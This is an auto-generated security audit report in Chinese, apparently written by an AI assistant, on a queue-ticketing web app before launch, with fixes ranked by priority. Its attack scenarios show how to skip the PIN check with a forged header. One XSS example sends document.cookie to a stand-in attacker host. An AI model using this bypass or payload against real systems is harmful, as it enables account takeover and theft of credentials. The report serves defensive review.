## Vibe Coding — 資安審計報告 (自動產生)

日期: 2025-08-29

說明：此文件為針對本專案在 Go-Live 前的全面安全審計，重點從「新手常犯的致命錯誤」角度出發，並提供可執行的修復建議與優先順序（高/中/低）。

-------------------------

## 一、專案基本資訊
- 專案名稱：digital-queue-widget (從 `package.json` 讀得)
- 簡介：可嵌入的叫號系統（kiosk widget + agent dashboard + lobby display）。
- 目標使用者：櫃台/服務人員 (agents)、使用者（kiosk 端）、大廳顯示器（lobby）及系統管理員。
- 處理資料類型：
  - 使用者/票券資料（ticket id, phone 等）
  - 可能包含個人識別資訊 (PII)：電話號碼（部分遮罩儲存） → 是，屬於 PII
  - 支付/財務資訊：無明顯處理（未發現付款流程）
  - 使用者上傳內容（UGC）：無檔案上傳 API（僅 captcha / qrcode）
- 技術棧：
  - 前端：純 HTML/CSS/Vanilla JS (位於 `public/`，包含 agent/admin/kiosk/lobby/login/ticket 等頁面)
  - 後端：Node.js + Express (`server.js`)
  - 資料庫：SQLite (`db/queue.db`，使用 `better-sqlite3`)
  - 即時通訊：Socket.IO
  - 其它：bcryptjs、qrcode、svg-captcha、sharp
- 部署環境/伺服器類型：目前為 HTTP server (node http)，未強制 TLS（需在反向代理/Load balancer 加 TLS）
- 外部依賴：見 `package.json`（已讀取）；建議執行 `npm audit` 以確認 CVE
- 程式碼存取：本次審計基於 repo 中 `server.js` 與 `public/**/*.html|js` 檔案內容

-------------------------

## 二、檢核需求清單（我會逐項覆核，並在報告中標註狀態）
- 公開前端是否有硬編碼秘密（API keys、密碼等） → Done（未發現明顯硬編碼秘密）
- 伺服器是否存在可被公開下載的敏感檔案 → Done（public 資料夾安全邊界正常，但需防止不必要的公開目錄）
- 不安全的檔案/目錄權限（777 等） → Deferred（Windows 環境下無 chmod 資訊，請在部署 Linux 主機時檢查）
- Web server 阻擋 .env/.git 等敏感檔案 → Done（Express static 只服務 `public/`；但請確認反向代理設定）
- 秘密管理（硬編碼憑證） → Done（無硬編碼，AGENT_PIN 由環境變數提供，但有其它弱點，詳見下文）
- OWASP Top 10 檢查 → Done（下方細項分析）
- 供應鏈檢查（依賴 CVE） → Deferred（需 `npm audit`/SCA 工具，建議授權執行）
- TLS 與資料加密 → Done（未強制 TLS，資料庫靜態加密未實施）

-------------------------

## 三、重點發現（依風險等級排序）

1) 威脅標題：高風險 - 權限控制失效（任意人可透過 HTTP header 繞過 PIN 認證）
   * 風險等級：高
   * 威脅描述：`server.js` 中的 `requirePin` 中實作為：
     - 從 `x-agent-pin` / `req.body.pin` / `req.query.pin` 取 PIN
     - 但若 `x-agent-name` header 存在，會直接放行（Allow if correct pin OR if an agent name header is present）
     - 也就是說，任何可以送出自訂 header 的客戶端（例如 fetch、curl、Postman、或瀏覽器內的 JS）都能用 `x-agent-name` 欄位繞過 PIN，直接呼叫需要授權的 API（例如 `/api/agent/*`, `/api/agents` 的 CRUD、`/api/agents/:id` PUT/DELETE、以及其他 requirePin 保護的 API）。
   * 受影響的元件：`server.js` -> function `requirePin`；所有使用 `requirePin` 的路由，例如 `/api/agent/*`, `/api/agents` 等；`public/admin/agents.html` 客戶端行為也依賴此 flow。

   --- (高風險專屬區塊) ---
   * 駭客攻擊劇本 (Hacker's Playbook):
     > 我是一個外部攻擊者。我打開 Postman，對你的伺服器發送一個 POST 到 `/api/agent/callNext`，在 Headers 加入 `x-agent-name: attacker`，並放 body `{ "serviceType": "A" }`。伺服器的 `requirePin` 看到 `x-agent-name` 存在就放行，我成功叫出一張票並在系統中觸發所有 agent 事件。接下來我可以用相同手法呼叫 `/api/agents` 新建/刪除 agent，或是更改票務狀態。

   * 修復原理 (Principle of the Fix):
     > 認證與授權要建立在伺服器端「不可偽造」的憑證上（例如：經過 HMAC 或 JWT 簽章的 Token、或經安全通道儲存/校驗的 session cookie）。HTTP Header 可以被客戶端任意設定，不能當作「可信」的認證憑證。正確做法是把敏感認證資料存在伺服器端（或簽發可驗證的 token），並且把權限檢查放在伺服器，不能以存在某 header 為授權條件。

   * 修復建議與程式碼範例：
     - 立即修復（緊急）：修改 `requirePin`，去掉以 `x-agent-name` 作為放行條件，只接受：
       1. `x-agent-pin` 與環境變數 `AGENT_PIN` 的精確比對（建議 PIN 為高熵 secret 而非 4 位數），或
       2. 使用短時效的 Bearer Token（由伺服器產生並簽章），或
       3. 建立伺服器端 session 與 cookie（HttpOnly, Secure, SameSite=strict）並以該 session 驗證。
     - 範例修補（示意，放在 `server.js` 中）：
       ```js
       function requirePin(req, res, next){
         const pin = req.headers['x-agent-pin'] || req.body?.pin || req.query?.pin;
         // Remove header-based name bypass
         if (!AGENT_PIN || pin !== AGENT_PIN) return res.status(401).json({ error: 'unauthorized' });
         next();
       }
       ```
     - 更佳做法：不要使用短弱 PIN 作為唯一認證，改為伺服器簽發 JWT 或 session（示例：`/login` 用 password 驗證後伺服器回傳 HttpOnly cookie），且所有敏感 API 都要驗證該伺服器簽章的 Cookie/JWT。
     - 推薦工具/函式庫：`express-session`（搭配 Redis）、`jsonwebtoken`（JWT）以及 HMAC 驗證實作。

   --- (結束)


2) 威脅標題：高風險 - CSRF 與 admin CSRF 流程失效 / CSRF token 可輕易被取得
   * 風險等級：高
   * 威脅描述：
     - `requireCsrf` 只在有 `Origin` header 並且 `Origin` 在 `ALLOWED_ORIGINS` 時才檢查 CSRF token；但是非瀏覽器請求（curl/PostMan）沒有 `Origin`，因此 CSRF 驗證被跳過。
     - `/api/admin/csrf` 本身需要 `requirePin`，但由於 `requirePin` 可被 `x-agent-name` 繞過（見問題 1），攻擊者可以先用 `x-agent-name` 取得 CSRF token，然後用該 token 呼叫需要 CSRF 的 API。
   * 受影響的元件：`server.js` 的 `requireCsrf`、`/api/admin/csrf`，以及依賴 CSRF token 的 admin CRUD 路由。

   * 駭客攻擊劇本 (Hacker's Playbook):
     > 我先用 `x-agent-name: intruder` 取得 `/api/admin/csrf`（伺服器會回傳 csrfToken），再把 `x-csrf-token` 放到接下來的請求中，呼叫 `/api/agents` 建立/刪除帳號。整個過程我不用實際知道 PIN，也不需要瀏覽器交互。

   * 修復原理：
     > CSRF 防護應強制在所有會改變狀態的請求上生效，且 CSRF token 應該與伺服器端 session 綁定（或使用雙送欄位/雙重驗證）。不要在沒有可信驗證的情況下發放 CSRF token。

   * 修復建議：
     - 立刻：將 `requireCsrf` 改為無論是否有 Origin，都檢查 `x-csrf-token`，並確保該 token 與伺服器端的 session 或 agent 身分綁定。
     - 把 admin 認證（PIN）從前端 sessionStorage 移除，改為伺服器端 session 或 JWT。若還是要使用 PIN，請用它來交換短時效 signed token（由伺服器簽名），而非直接儲存在 client-side storage。
     - 範例：當 admin 用 PIN 成功呼叫 `/api/admin/login` 後，伺服器回傳 `Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict`，並把 CSRF token 綁在該 session 上；之後所有修改性 API 檢查 session 與相對應的 CSRF token。


3) 威脅標題：高風險 - 管理員 PIN 與 CSRF token 存在 client-side（sessionStorage）；容易被 XSS 或本機攻擊竊取
   * 風險等級：高
   * 威脅描述：`public/admin/agents.html` 將 admin PIN 與 CSRF token 儲存在 `sessionStorage`，若前端出現 XSS（例如 admin 名稱或 agent 名稱被注入）或瀏覽器外掛惡意讀取，則敏感憑證會洩漏。
   * 受影響的元件：`public/admin/agents.html`、`public/agent/index.html` 的 sessionStorage 使用
   * 修復建議：使用 HttpOnly, Secure cookies 儲存 session；避免在客戶端以明文保存管理 PIN 或 tokens。


4) 威脅標題：中/高風險 - 管理介面及 agent 端存在未消毒的 HTML 插入 (可能導致 XSS)
   * 風險等級：中（但在與第 1、2 類弱點結合時會升為高）
   * 威脅描述：在 `public/admin/agents.html` 的 `loadAgents()`，使用模板字串把 `a.account`、`a.name` 等值直接插入 HTML，未做 HTML Escaping。若資料庫中某 agent 的 `name` 或 `account` 包含惡意程式碼，開啟該頁的管理者會被執行惡意 JavaScript。
   * 受影響的元件：`public/admin/agents.html` -> `loadAgents()`、`public/agent/*` 以及任何把伺服器回傳字串插入 innerHTML 的程式碼。
   * 駭客攻擊劇本（示意）：
     > 我在註冊 agent 時把 name 設為 `<img src=x onerror=fetch("https://attacker/steal?c="+document.cookie)>`。管理員開啟 agents 管理頁就會觸發該程式碼，將管理員的 session（若存在）或 local/sessionStorage 裡的值發送到攻擊者。
   * 修復建議：
     - 在所有將伺服器資料插入 DOM 的地方使用安全的 DOM APIs（例如 `textContent`、`createTextNode`、或明確的 HTML-escape），避免使用 `innerHTML` 或模板字串拼接帶入不信任資料。
     - 若要允許少量 HTML，使用可信的 sanitizer（例：DOMPurify）。


5) 威脅標題：中風險 - Content-Security-Policy 使用 'unsafe-inline'，降低 XSS 防護效力
   * 風險等級：中
   * 威脅描述：在 `server.js` 設定 CSP 時使用了 `script-src 'self' 'unsafe-inline'` 與 `style-src 'self' 'unsafe-inline'`。`'unsafe-inline'` 讓內嵌 script/style 可以執行，降低 CSP 對 XSS 的緩解效果。
   * 受影響的元件：`server.js` 中 CSP header 設定
   * 修復建議：
     - 移除 `'unsafe-inline'`，改為使用 nonce 或 hash 的方式允許必要的內嵌 script（例如：動態產生 nonce 並在頁面中使用）。
     - 逐步重構前端，將內嵌 script 移到外部檔案以便被 CSP 管理。


6) 威脅標題：中風險 - 未強制 HTTPS / 傳輸層保護缺失
   * 風險等級：中
   * 威脅描述：`server.js` 使用原生 http server，未強制 TLS。API 與敏感 header（如 `x-agent-pin`）在未加密連線下會被竊聽。
   * 受影響元件：整個服務（server.ts / server.js 與網路通訊路徑）
   * 修復建議：
     - 在 production 使用 HTTPS（反向代理如 Nginx / Cloud Load Balancer 給 TLS），並在 Node.js 層面透過 `req.secure` 或 `app.set('trust proxy', true)` 來檢查安全連線。
     - 標頭中敏感資料應只以 HttpOnly + Secure cookie 或經過 TLS 的 Authorization header 傳遞。


7) 威脅標題：中風險 - 資料庫 (SQLite) 靜態加密與備份保護不足
   * 風險等級：中
   * 威脅描述：`db/queue.db` 為明文 SQLite 檔案，若伺服器機器或備份被盜，PII（電話）與帳號資料會外洩。
   * 受影響元件：`db/queue.db` 檔案、備份策略
   * 修復建議：
     - 在生產環境採用受限權限的資料庫帳號（如果使用 RDBMS），或使用檔案系統加密（例如 LUKS、BitLocker）/資料庫層加密插件。
     - 限制檔案系統權限（只有運行服務的系統帳號可讀寫），並不要把 db 目錄放在可被 Web 伺服器服務的路徑下。
     - 設計備份加密與 access control，避免把備份上傳到公開 S3 Bucket。


8) 威脅標題：低/中風險 - phone verify (verify4) 為弱驗證機制
   * 風險等級：低至中
   * 威脅描述：以 phone 的後四碼作為驗證（可選），這是低熵且易被猜測的方法，不能當作強驗證。
   * 受影響元件：`/api/agent/finish` 的 verify4 機制
   * 修復建議：改用一次性驗證碼（SMS OTP）或其它更高強度驗證方式，或至少限制嘗試次數與記錄驗證失敗日誌。


9) 威脅標題：低風險 - 依賴與供應鏈檢查尚未執行
   * 風險等級：低（需透過自動工具確認）
   * 威脅描述：`package.json` 列出常用套件（express, socket.io, better-sqlite3, sharp 等）。未在此報告中掃描 CVE。建議執行 `npm audit`、Snyk、Dependabot 或類似 SCA 工具以評估已知漏洞。
   * 修復建議：在 CI 中加入 `npm audit` / SCA，並維護 lockfile（package-lock.json）。


## 四、業務邏輯風險觀察
- 任意人可透過 header 繞過 PIN 後執行 agent 操作，可能造成服務濫用、票號被惡意修改或刪除，影響服務可用性與信任度（高）
- 票券查詢與狀態修改 API（例如 callSpecific, transfer, cancel）若被濫用，會導致業務混亂與客服負擔（中高）


## 五、供應鏈 / 運維建議（快速清單）
- 立刻：修正 `requirePin`，停用 `x-agent-name` 的放行行為；在 production 禁止把 PIN 或 token 存於 sessionStorage。
- 24 小時內：部署在 HTTPS（反向代理 + TLS），並在 proxy 層加上兩階段防護（IP 限制 / WAF 規則）。
- 72 小時內：在 CI 加入自動 SCA（npm audit / Snyk），針對高風險套件進行補丁或替換。
- 中期：考慮把 agent/admin 認證改為更正式的認證系統（password + 2FA，或 OAuth + RBAC），並引入審計日誌（audit trail）。


## 六、待詢問與需要授權的項目（請回覆）
1. 你是否同意我替你產生一個只讀的程式碼掃描腳本（Python/Node），用正則在整個專案搜尋像 `x-agent-name`、`sessionStorage`、`innerHTML`、`eval`、`unsafe-inline` 等關鍵字以找出可能的複製弱點？（此腳本僅搜尋，不會修改檔案）
2. 目前部署方式？會以 Node 直接暴露外網，還是放在 Nginx / 反向代理後面？是否能提供反向代理設定供我檢視？
3. 你是否願意在 CI 中執行 `npm audit` 或授權我執行一遍並回傳輸出？（以便確認依賴 CVE）


## 七、品質檢查（建議優先順序）
- P0 (立即) ：修復 `requirePin` 繞過、修正 CSRF 流程、停止 client-side 儲存 PIN
- P1 (重要) ：移除 `'unsafe-inline'`、部署 HTTPS、避免在 innerHTML 中插入未轉義內容
- P2 (改善) ：加入依賴掃描、加強 DB 檔案保護、強化驗證流程（OTP / 2FA）


## 八、快速修補範例（要點）
1) 移除 x-agent-name bypass（`server.js`）：
   - 如上示例程式碼，直接比較 `x-agent-pin` 與 `AGENT_PIN`，或改為伺服器簽發短時效 token

2) 強化 CSRF 與 Admin 認證：
   - admin 登入路徑：以 PIN 換取伺服器 session（`express-session`）並以 HttpOnly cookie 返回
   - CSRF token 與 session 綁定（伺服器儲存），所有 state-changing requests 都要檢查

3) 防 XSS：避免 innerHTML，改用 `textContent` 或 DOM 節點插入；或使用 DOMPurify 清理。

4) CSP 改善範例：
   - 先移除`'unsafe-inline'`，若必須允許少數內嵌 script，使用 nonce：
     - 伺服器在每次回應產生 nonce，加到 `Content-Security-Policy: script-src 'self' 'nonce-<RANDOM>'`，並在頁面中把 nonce 寫到相應 `<script nonce="...">`。


## 九、驗收準則（How we know it's fixed）
- `requirePin` 不再接受 `x-agent-name` 作為放行條件；嘗試以 header 繞過應被拒絕（401）。
- CSRF token 只有在 valid server session 上可被發放，並且所有 state-changing API 在缺少 token 時會回 403。
- admin PIN 不再以 sessionStorage 儲存；改用 HttpOnly cookie 或類似伺服器端 session。
- 無明顯 XSS：使用自動化掃描器（OWASP ZAP/ Burp 的 XSS 檢測）驗證關鍵頁面。

-------------------------

結語：我已把本次審計結果寫入此檔 `security-fixes.md`。建議先處理 P0 問題（認證/授權/CSRF/存放憑證），之後分階段修補 CSP/XSS/Transport/DB 保護。若你同意，我可以：
- （A）立刻替你修改 `server.js` 中 `requirePin` 的實作並提交 PR（會先在 branch 做更改並執行快速測試）
- （B）產生一個只讀的掃描腳本來找出程式庫中相似的風險模式（`innerHTML`, `sessionStorage`, `x-agent-name`, `'unsafe-inline'` 等），以便全面修補

請回覆你想要我下一步採取哪個行動（A 或 B 或 兩者皆要），或直接授權我執行 `npm audit` 與/或建立 PR 。
